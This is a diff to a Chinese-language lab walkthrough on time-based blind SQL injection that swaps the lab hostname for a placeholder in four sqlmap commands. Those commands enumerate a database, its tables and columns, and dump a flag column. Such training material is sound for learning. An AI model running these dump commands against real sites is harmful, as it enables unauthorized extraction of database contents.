@@ -15,7 +15,7 @@ SQL 时间盲注
 ### 0x01.1 dump database
 
 ```bash
-./sqlmap.py -u http://injectx1.lab.aqlab.cn:81/Pass-10/index.php?id=1 --current-db
+./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 --current-db
 ```
 
 **执行结果**
@@ -27,7 +27,7 @@ current database: 'kanwolongxia'
 ### 0x01.2 dump tables
 
 ```bash
-./sqlmap.py -u http://injectx1.lab.aqlab.cn:81/Pass-10/index.php?id=1 -D kanwolongxia --tables
+./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia --tables
 
 ```
 
@@ -48,7 +48,7 @@ Database: kanwolongxia
 ### 0x01.3 dump columns
 
 ```bash
-./sqlmap.py -u http://injectx1.lab.aqlab.cn:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag --columns
+./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag --columns
 ```
 
 **执行结果**
@@ -68,7 +68,7 @@ Table: loflag
 ### 0x01.4 dump values
 
 ```bash
-./sqlmap.py -u http://injectx1.lab.aqlab.cn:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag -C flaglo --dump
+./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag -C flaglo --dump
 
 ```
 
